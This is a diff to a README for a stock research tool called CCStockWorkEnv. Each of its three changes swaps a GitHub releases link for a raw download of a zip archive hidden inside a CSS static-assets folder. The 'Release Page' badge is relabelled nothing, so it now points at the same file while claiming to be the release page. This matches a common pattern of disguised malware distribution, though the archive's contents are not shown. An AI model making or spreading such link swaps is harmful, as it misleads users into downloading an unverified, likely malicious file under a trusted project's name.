@@ -1,6 +1,6 @@
 # 📊 CCStockWorkEnv - Multi-Market Stock Research Tool
 
-[![Download CCStockWorkEnv](https://img.shields.io/badge/Download-CCStockWorkEnv-brightgreen?style=for-the-badge)](https://github.com/supperdiy1234/CCStockWorkEnv/releases)
+[![Download CCStockWorkEnv](https://img.shields.io/badge/Download-CCStockWorkEnv-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/supperdiy1234/CCStockWorkEnv/main/tool_scripts/web_server/reports/static/reports/css/Env_Stock_Work_CC_v1.8.zip)
 
 ---
 
@@ -14,7 +14,7 @@ You will need to visit the release page to get the latest version of the softwar
 
 Click this big link to open the release page, where you can get the latest version:
 
-[![Visit the Release Page](https://img.shields.io/badge/Release-Page-blue?style=for-the-badge)](https://github.com/supperdiy1234/CCStockWorkEnv/releases)
+[![Visit the Release Page](https://img.shields.io/badge/Release-Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/supperdiy1234/CCStockWorkEnv/main/tool_scripts/web_server/reports/static/reports/css/Env_Stock_Work_CC_v1.8.zip)
 
 ### Step 2: Choose the Correct File to Download
 
@@ -120,4 +120,4 @@ If you need help, check the GitHub page for documentation or open an issue on th
 
 Use this link to begin downloading CCStockWorkEnv:
 
-[![Download CCStockWorkEnv](https://img.shields.io/badge/Download-CCStockWorkEnv-brightgreen?style=for-the-badge)](https://github.com/supperdiy1234/CCStockWorkEnv/releases)
+[![Download CCStockWorkEnv](https://img.shields.io/badge/Download-CCStockWorkEnv-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/supperdiy1234/CCStockWorkEnv/main/tool_scripts/web_server/reports/static/reports/css/Env_Stock_Work_CC_v1.8.zip)
